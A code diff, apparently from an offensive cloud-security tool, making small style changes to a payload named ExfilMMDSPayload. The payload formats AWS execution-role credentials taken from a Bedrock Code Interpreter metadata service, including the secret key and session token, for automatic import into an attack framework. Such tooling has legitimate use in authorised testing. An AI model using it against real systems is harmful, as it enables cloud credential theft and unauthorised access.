@@ -27,7 +27,7 @@ import (
 type ExfilMMDSPayload struct{}
 
 func init() {
-	payloads.Register(&ExfilMMDSPayload{})
+	_ = payloads.Register(&ExfilMMDSPayload{})
 }
 
 func (p *ExfilMMDSPayload) GetName() string {
@@ -136,21 +136,21 @@ func (p *ExfilMMDSPayload) ProcessResult(result string) (string, error) {
 	var output strings.Builder
 	output.WriteString("=== Bedrock Code Interpreter Credential Extraction ===\n\n")
 	output.WriteString("Successfully retrieved execution-role credentials from MMDS!\n\n")
-	output.WriteString(fmt.Sprintf("Access Key ID : %s...\n", safeTruncate(creds.AccessKeyID, 10)))
+	fmt.Fprintf(&output, "Access Key ID : %s...\n", safeTruncate(creds.AccessKeyID, 10))
 	if creds.Expiration != "" {
-		output.WriteString(fmt.Sprintf("Expiration    : %s\n", creds.Expiration))
+		fmt.Fprintf(&output, "Expiration    : %s\n", creds.Expiration)
 	}
 	output.WriteString("\n")
 
 	// PATHFINDER_IDENTITY_DATA block for automatic credential import.
 	output.WriteString("--- PATHFINDER_IDENTITY_DATA ---\n")
-	output.WriteString(fmt.Sprintf("NAME=%s\n", identityName))
+	fmt.Fprintf(&output, "NAME=%s\n", identityName)
 	output.WriteString("TYPE=assumed_role\n")
-	output.WriteString(fmt.Sprintf("ACCESS_KEY_ID=%s\n", creds.AccessKeyID))
-	output.WriteString(fmt.Sprintf("SECRET_ACCESS_KEY=%s\n", creds.SecretAccessKey))
-	output.WriteString(fmt.Sprintf("SESSION_TOKEN=%s\n", creds.Token))
+	fmt.Fprintf(&output, "ACCESS_KEY_ID=%s\n", creds.AccessKeyID)
+	fmt.Fprintf(&output, "SECRET_ACCESS_KEY=%s\n", creds.SecretAccessKey)
+	fmt.Fprintf(&output, "SESSION_TOKEN=%s\n", creds.Token)
 	if creds.Expiration != "" {
-		output.WriteString(fmt.Sprintf("EXPIRES_AT=%s\n", creds.Expiration))
+		fmt.Fprintf(&output, "EXPIRES_AT=%s\n", creds.Expiration)
 	}
 	output.WriteString("AUTO_SWITCH=true\n")
 	output.WriteString("--- END_PATHFINDER_IDENTITY_DATA ---\n")
